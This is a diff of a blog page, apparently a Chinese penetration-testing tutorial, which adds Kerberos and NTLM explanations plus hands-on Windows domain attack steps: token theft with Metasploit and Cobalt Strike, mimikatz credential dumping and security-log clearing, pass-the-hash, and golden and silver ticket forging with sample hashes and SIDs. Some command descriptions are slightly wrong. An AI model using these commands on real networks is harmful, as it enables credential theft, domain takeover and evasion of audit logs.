@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-22
+                    2022-04-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    759
+                    3.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    13 分
                 </div>
                 
 
@@ -563,24 +563,213 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 </li>
 </ol>
 <p>msf用<code>exploit/windows/local/bypassuac</code>同理，设置session，然后run一下，但是如果你的权限够高，他就不会给你提提权（比如你当前的权限是administrator，system等）</p>
-<p>会有以下报错</p>
+<p>会有以下报错。</p>
 <p><img src="/2022/04/15/nei-wang-shen-tou-zhuan-ti-san/image-20220420131753036.png"></p>
-<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>什么是令牌？</p>
-<p>临时秘钥，如U盾</p>
-<p>伪造令牌：kerberos协议</p>
-<p>msf：<code>list_token_u</code>权限越高，令牌越多</p>
-<p>msf假冒令牌</p>
-<h2 id="纵向，横向移动"><a href="#纵向，横向移动" class="headerlink" title="纵向，横向移动"></a>纵向，横向移动</h2><p><code>migrate 1880</code>：进程迁移</p>
-<p>use incognito</p>
-<p>c$，ipc$</p>
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p><strong>令牌窃取并非提权</strong></p>
+<p><strong>伪造令牌攻击的核心是 Kerberos 协议。</strong></p>
+<h4 id="Kerberos-协议"><a href="#Kerberos-协议" class="headerlink" title="Kerberos 协议"></a><strong>Kerberos 协议</strong></h4><blockquote>
+<p>Kerberos实际上是一种基于票据（Ticket）的认证方式。客户端要访问服务器的资源，需要首先购买服务端认可的票据，等待服务验票之后才能入场。在这之前，客户端需要先买票，但是这张票不能直接购买，需要一张认购权证。客户端在买票之前需要预先获得一张认购权证。这张认购权证和进入服务器的入场券均由KDC发售。</p>
+</blockquote>
+<p>过程中涉及到的专有名词有：</p>
+<pre class="line-numbers language-none"><code class="language-none">KDC(Key Distribution Center) : 密钥分发中心
+KAS(Kerberos Authentication Service) : kerberos认证服务
+TGT(Ticket Granting Ticket) : 认购权证
+TGS(Ticket Granting Service) : 票据授予服务
+ST(Service Ticket) : 服务票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>获取TGT</strong></p>
+<ol>
+<li>首先在用户登陆时，Kerberos服务向KDC(域控)发送申请认购权证的请求，内容为登录输入的用户名和经过输入密码<strong>加密的Authenticator</strong>(用于确认身份的，往下看就会明白)</li>
+<li>KDC(域控)拿到传来的数据后，会根据用户名到活动目录(Active Directory)的数据库中寻找该用户的密码，然后使用该密码解密<strong>加密的Authenticator</strong>，然后与<strong>原始的Authenticator</strong>对比，如果一致，则确认用户身份。</li>
+</ol>
+<img src="内网渗透专题（三）/20191019215735-6752f892-f278-1.png" style="zoom:50%;">
+
+<ol start="3">
+<li><p>KDC(域控)确认登录用户身份正确后，先生成一个由用户密码加密的<strong>加密Logon Session Key</strong>（为了确保通信安全）。然后生成TGT(包含用户信息和<strong>原始Logon Session Key</strong>)，再使用KDC的密钥（即krbrgt用户的密钥）加密TGT生成<strong>加密后的TGT</strong>。然后将由用户密码加密的<strong>加密Logon Session Key</strong>和<strong>加密后的TGT</strong>返回给客户端</p>
+</li>
+<li><p>客户端拿到<strong>加密Logon Session Key</strong>和TGT后，先用自己的密码解密<strong>加密Logon Session Key</strong>得到<strong>原始Logon Session Key</strong>，然后将<strong>原始Logon Session Key</strong>和TGT缓存到本地</p>
+</li>
+</ol>
+<p><strong>获取ST</strong></p>
+<p>当用户想要访问某个服务时，会经过以下过程：</p>
+<ol>
+<li>客户端向TGS请求购买ST，请求内容包括用户名、经Logon Session Key加密的Authenticator、请求访问的服务名、TGT</li>
+<li>接收到请求后，TGS使用自己的密钥(krbtgt用户的密钥)解密TGT得到用户信息和<strong>原始Logon Session Key</strong>，然后使用<strong>原始Logon Session Key</strong>解密出Authenticator，与TGS本地的Authenticator对比一致后确认用户身份。</li>
+<li>TGS生成一个经Logon Session Key加密的Service Session Key，然后生成ST（包含请求用户的信息以及原始Logon Session Key），然后将Service Session Key和ST返回给客户端</li>
+</ol>
+<h4 id="什么是令牌？"><a href="#什么是令牌？" class="headerlink" title="什么是令牌？"></a>什么是令牌？</h4><p>是个临时秘钥，如U盾。</p>
+<p>令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来，令牌有很多种，比如访问令牌（Access Token）表示访问控制操作主题的系统对象；密保令牌（Security Token）又叫作认证令牌或者硬件令牌，是一种计算机身份效验的物理设备，会话令牌是交互会话中唯一的身份标识符。</p>
+<p>access token是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该user账户相关的进程或线程的身份和权限信息。当user登录时，系统通过将user输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统此时会为user生成一个访问令牌。之后，该user执行的每个进程都会拥有一个该访问令牌的拷贝。</p>
+<h4 id="令牌的种类"><a href="#令牌的种类" class="headerlink" title="令牌的种类"></a><strong>令牌的种类</strong></h4><ol>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进行通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ol>
+<blockquote>
+<p>​        主令牌和模拟令牌，会在系统重启或者关机后全部清除，不然将会一直在内存中存留。也就是说，如果机器不关机或者重启的话，就会存在散落的令牌。但是，由于权限的问题，当前账号只能看到自己的访问令牌和比自己权限低的账号的访问令牌。如果想看到所有访问令牌，需要当前权限为系统最高权限才行。</p>
+</blockquote>
+<h4 id="常见的伪造工具"><a href="#常见的伪造工具" class="headerlink" title="常见的伪造工具"></a><strong>常见的伪造工具</strong></h4><p>Metasploit 中的 incognito 插件</p>
+<p>Windows 平台下的 <a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">incognito</a> 工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">Invoke-TokenManipulation.ps1</a> 脚本</p>
+<p>Mimkatz 中的 token::list</p>
+<p>CobaltSrike 中的 steal_token 插件</p>
+<h4 id="Metasploit-中的-incognito-插件"><a href="#Metasploit-中的-incognito-插件" class="headerlink" title="Metasploit 中的 incognito 插件"></a><strong>Metasploit 中的 incognito 插件</strong></h4><p>msf假冒令牌，生成一个反弹shell，在kali上进行监听操作，提权到system权限。</p>
+<img src="内网渗透专题（三）/image-20220423124504820.png" style="zoom:50%;">
+
+<p>加载 incognito 插件，列出当前可以令牌伪造的清单，<code>list_token_u</code>权限越高，令牌越多</p>
+<img src="内网渗透专题（三）/image-20220423124549813.png" style="zoom: 67%;">
+
+<p><code>impersonate_token</code>+令牌伪造用户,伪造成功。</p>
+<img src="内网渗透专题（三）/image-20220423125044203.png" style="zoom: 67%;">
+
+<h4 id="CobaltSrike-中的-steal-token-插件"><a href="#CobaltSrike-中的-steal-token-插件" class="headerlink" title="CobaltSrike 中的 steal_token 插件"></a><strong>CobaltSrike 中的 steal_token 插件</strong></h4><img src="内网渗透专题（三）/image-20220423185927490.png" style="zoom: 67%;">
+
+<p>生成木马，监听。</p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%93%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20220423190019510.png"></p>
+<p>点击Interact。</p>
+<p>提权到system权限，<code>getsystem</code></p>
+<p>ps查看进程</p>
+<img src="内网渗透专题（三）/image-20220423192755613.png" style="zoom: 50%;">
+
+<p><code>steal_token PID</code>：获取到某个用户的令牌</p>
+<p>这里PID选的3152，令牌窃取成功</p>
+ <img src="内网渗透专题（三）/image-20220423193039506.png" style="zoom: 67%;">
+
+
+
 <h2 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h2><p>至少是administrator权限使用</p>
 <p>域环境中，用户信息ntds.dit，加密后为散列值</p>
 <p>LM Hash NTLM Hash</p>
 <p>hash结构：user1:RID:LM-Hash:NT-Hash</p>
 <p>NTLM Hash基于md4加密算法</p>
 <p><code>"privilege::debug" "log" "sekurlsa::logonpassword"</code></p>
+<h4 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h4><p><strong>:: #查看帮助信息</strong></p>
+<ol>
+<li>privilege::debug ：提升权限；</li>
+</ol>
+<img src="内网渗透专题（三）/image-20220423200827777.png" alt="image-20220423200827777" style="zoom:50%;">
+
+<ol start="2">
+<li><p>process::list：查看进程列表</p>
+<img src="内网渗透专题（三）/image-20220423200958371.png" style="zoom:67%;">
+</li>
+<li><p>process::start calc #开启一个计算机进程</p>
+</li>
+</ol>
+   <img src="内网渗透专题（三）/image-20220423201144553.png" style="zoom: 50%;">
+
+<ol start="4">
+<li><p>process::lsadump #挂起进程：可用于植入木马时，暂停防病毒软件等</p>
+</li>
+<li><p>event::clear #清除操作系统的安全日志</p>
+</li>
+<li><p>event::drop #不再产生新的日志</p>
+</li>
+<li><p>token::whoami</p>
+</li>
+<li><p>sekurlsa::logonPasswords #查看当前登录的账户和明文密码</p>
+</li>
+</ol>
 <h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass-the-hash"></a>pass-the-hash</h2><p><code>mimikatz "privilege::debug" "sekurlsa::pth /user:xxx /domain:test1.com /aes256: xxxxx" </code></p>
-<h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2>
+<h2 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h2><p>票据传递攻击三种方法</p>
+<blockquote>
+<p>黄金票据</p>
+<p>白银票据</p>
+<p>PTT攻击</p>
+</blockquote>
+<h4 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h4><p>通过伪造TGT，来进行下一步的Kerberos认证，从而获取到访问服务器的ST</p>
+<p>制造条件：</p>
+<p>1、域名称</p>
+<p>2、域的SID（Object Security ID）值</p>
+<p>3、域的KRBTGT账户密码HASH（可以是aes256_hmac或者是ntml hash）</p>
+<p>4、伪造用户名，可以是任意的</p>
+<p><strong>使用Mimikatz来提取krbtgt的NTLM-Hash。</strong></p>
+<p>1.获取域名称</p>
+<pre class="line-numbers language-none"><code class="language-none">net view /domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz "lsadump::dcsync /domain:test666.com /user:krbtgt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3..Mimikatz生成黄金票据</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz "kerberos::golden /domain:test666.com /sid:S-1-5-21-1497092113-2272191533-193330055 /krbtgt:ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>利用步骤：</p>
+<h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>命令获取krbtgt的值。</p>
+<h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p> 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<p>参数说明：</p>
+<pre class="line-numbers language-none"><code class="language-none">/admin：伪造的用户名
+/domain：域名称
+/sid：SID值，注意是去掉最后一个-后面的值
+/krbtgt：krbtgt的HASH值
+/ticket：生成的票据名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="导入伪造Golden-Ticket获得域控权限"><a href="#导入伪造Golden-Ticket获得域控权限" class="headerlink" title="导入伪造Golden Ticket获得域控权限"></a><strong>导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<pre class="line-numbers language-none"><code class="language-none">kerberos::purge
+kerberos::ppt golden.kiribi
+kerberos::list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
+<pre class="line-numbers language-none"><code class="language-none">dir \\OWA2010SP3.0day.org\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
+<li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li>
+<li>可以伪造任意用户，即使其不存在。</li>
+<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li>
+</ul>
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt; 1.txt
+sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>伪造白银票据</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>参数说明：</p>
+<pre class="line-numbers language-none"><code class="language-none">/domain：当前域名称
+/sid：SID值，和金票一样取前面一部分
+/target：目标主机，这里是OWA2010SP3.0day.org
+/service：服务名称，这里需要访问共享文件，所以是cifs
+/rc4：目标主机的HASH值
+/user：伪造的用户名
+/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul>
+<li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li>
+<li>Silver Ticket: 伪造TGS,只能访问指定的服务</li>
+</ul>
+<p><strong>2.加密方式不同</strong></p>
+<ul>
+<li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li>
+<li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li>
+</ul>
+<h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul>
+<li>Golden Ticket 的利用过程需要访问域控(KDC)</li>
+<li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li>
+</ul>
+<h2 id="Windows身份认证"><a href="#Windows身份认证" class="headerlink" title="Windows身份认证"></a>Windows身份认证</h2><p>做了不少关于提权，令牌窃取，盗取密码的例子，总结一下关于windows的身份验证。</p>
+<p>Windows身份认证机制主要有<strong>NTLM</strong>和<strong>Kerberos</strong>两种，其中NTLM主要被用在本地以及工作组环境，而在域环境中优先使用的是Kerberos。</p>
+<p>我们先了解NTLM机制。NTLM中最关键的凭证：<strong>NTLM Hash</strong>。正常的明文密码加密为NTLM Hash的方法如下：</p>
+<blockquote>
+<p>password —-&gt; 十六进制编码 —-&gt; Unicode转换 —-&gt; MD4加密 —-&gt; 得到NTLM Hash</p>
+</blockquote>
+<h4 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h4><p>在本地认证过程中，当用户进行注销、重启、开机等需要认证的操作时，首先Windows会调用<code>winlogon.exe</code>进程（也就是我们平常见到的登录框）接收用户的密码。</p>
+<p>之后密码会被传送给进程<code>lsass.exe</code>，该进程会先在内存中存储一份明文密码，然后将明文密码加密为NTLM Hash后，与Windows本地的SAM数据库（%SystemRoot%\system32\config\SAM）中该用户的NTLM Hash对比，如果一致则通过认证</p>
+<h4 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h4><p>网络认证需要使用NTLM协议，该协议基于<strong>挑战（Challenge）/响应（Response）</strong>机制。</p>
+<ol>
+<li>首先客户端向服务端发送本机的一些信息</li>
+<li>服务端接收到客户端的用户名后，先生成一个随机的16位的Challenge（挑战随机数），本地储存后将Challenge返回给客户端</li>
+<li>客户端接收到服务端发来的Challenge后，使用用户输入密码的NTLM Hash对Challenge进行加密生成Response（也叫Net NTLM Hash），将Response发送给服务端</li>
+<li>服务端接收到客户端发来的Response，使用数据库中对应用户的NTLM Hash对之前存储的Challenge进行加密，得到的结果与接收的Response进行对比，如果一致则通过认证</li>
+</ol>
+<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p>域环境中虽然默认首选是kerberos认证，但是也可以使用NTLM来进行认证。其实NTLM在域环境与工作组环境中的差异不大，区别主要是最终在域控(DC)中完成验证。</p>
+<h4 id="NTLM的缺陷"><a href="#NTLM的缺陷" class="headerlink" title="NTLM的缺陷"></a>NTLM的缺陷</h4><p>了解整个过程之后我们可以发现，在整个过程中用户的明文密码并没有在客户端和服务端之间传输，取而代之的是NTLM Hash。因此如果攻击者得到了用户的NTLM Hash，那么便可以冒充该用户通过身份验证（也就是说不需要破解出明文密码就可以通过验证），这就是hash传递攻击(Pass The Hash)。</p>
+<h4 id="Kerberos的缺陷"><a href="#Kerberos的缺陷" class="headerlink" title="Kerberos的缺陷"></a>Kerberos的缺陷</h4><p>从之前写的认证过程我们可以发现，Kerberos认证完全依赖于KDC的密钥（即krbtgt用户的密钥）。因此，如果攻击者拿到了krbtgt账号的hash的话，那么他就可以访问域中任何以kerberos协议做身份认证的服务。这就产生了票据传递攻击(Pass The Ticket)。</p>
+
                 
             </div>
             <hr/>
